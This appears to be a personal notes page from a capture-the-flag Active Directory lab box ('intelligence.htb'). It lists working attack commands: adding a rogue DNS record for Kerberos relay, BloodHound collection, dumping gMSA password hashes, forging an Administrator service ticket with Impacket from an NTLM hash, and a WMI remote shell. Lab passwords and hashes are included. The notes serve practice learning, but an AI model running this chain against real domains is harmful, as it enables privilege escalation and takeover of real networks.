# Learning

### Learnt an efficient way to use

* smbclient
* crackmapexec

### <mark style="background-color:green;">Learnt about Kerberos relay attack using DNS configuration</mark>

[https://github.com/dirkjanm/krbrelayx/tree/master](https://github.com/dirkjanm/krbrelayx/tree/master)

```python
./dnstool.py  -u 'Tiffany.Molina' -p `cat ../pass.txt` 10.10.10.248 -a add -r webl -d 10.10.14.13 -t A

```

### <mark style="background-color:green;">Learnt about running Bloodhound using CLI, without needing to use sharphound</mark>

```python
bloodhound-python -d intelligence.htb -u Ted.Graves -p Mr.Teddy -ns 10.10.10.248 -c All
```

### <mark style="background-color:green;">Learnt About new Active directory misconfiguration: Reading gMSA password blobs using the following tool</mark>

[https://github.com/micahvandeusen/gMSADumper](https://github.com/micahvandeusen/gMSADumper)

```python
python gMSADumper.py -u user -p e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c -d domain.local -l dc01.domain.local
```

### <mark style="background-color:green;">Learnt about fixing Skewed clock, which is required to create silver ticket</mark>

```python
In case of clock skew too great error, refer this blog
<https://medium.com/@danieldantebarnes/fixing-the-kerberos-sessionerror-krb-ap-err-skew-clock-skew-too-great-issue-while-kerberoasting-b60b0fe20069> 
```

## <mark style="background-color:green;">Learnt About creating Silver ticket using Impacket</mark>

```python
Impacket-getST -spn WWW/dc.intelligence.htb -impersonate Administrator intelligence.htb/svc_int -hashes :51e4932f13712047027300f869d07ab6
```

### <mark style="background-color:green;">Learnt about Injecting the silver ticket into env variable and using it to the machine</mark>

```python
export KRB5CCNAME=Administrator.ccache

echo "10.10.10.248 dc.intelligence.htb" | sudo tee -a /etc/hosts

impacket-wmiexec -k -no-pass dc.intelligence.htb

-k Use Kerberos authentication. Grab credentials from ccache file (KRB5CCNAME) based on the target parameter
```
